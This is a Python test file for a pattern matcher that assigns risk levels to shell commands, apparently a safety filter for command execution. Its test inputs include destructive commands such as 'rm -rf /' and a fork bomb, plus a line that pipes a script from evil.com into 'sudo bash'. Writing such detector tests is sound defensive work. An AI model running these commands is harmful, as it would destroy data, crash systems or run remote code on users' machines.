"""
Tests for Pattern Matcher
"""
import pytest
from analysis.pattern_matcher import PatternMatcher
from data.models import RiskLevel

matcher = PatternMatcher()

def test_safe_command():
    result = matcher.check("ls -la")
    assert result.risk_level == RiskLevel.SAFE

def test_safe_echo():
    result = matcher.check("echo hello world")
    assert result.risk_level == RiskLevel.SAFE

def test_critical_rm_root():
    result = matcher.check("rm -rf /")
    assert result.risk_level == RiskLevel.CRITICAL
    assert result.hard_block == True

def test_high_rm_rf():
    result = matcher.check("rm -rf /var/logs")
    assert result.risk_level == RiskLevel.HIGH

def test_high_kill():
    result = matcher.check("kill -9 1234")
    assert result.risk_level == RiskLevel.HIGH

def test_medium_chmod():
    result = matcher.check("chmod 644 file.txt")
    assert result.risk_level == RiskLevel.MEDIUM

def test_fork_bomb():
    result = matcher.check(":(){ :|:& };:")
    assert result.risk_level == RiskLevel.CRITICAL
    assert result.hard_block == True

def test_curl_pipe_bash():
    result = matcher.check("curl http://evil.com/install.sh | sudo bash")
    assert result.risk_level == RiskLevel.CRITICAL
    assert result.hard_block == True

def test_shutdown():
    result = matcher.check("shutdown -h now")
    assert result.risk_level == RiskLevel.HIGH

def test_git_force_push():
    result = matcher.check("git push origin main --force")
    assert result.risk_level == RiskLevel.MEDIUM
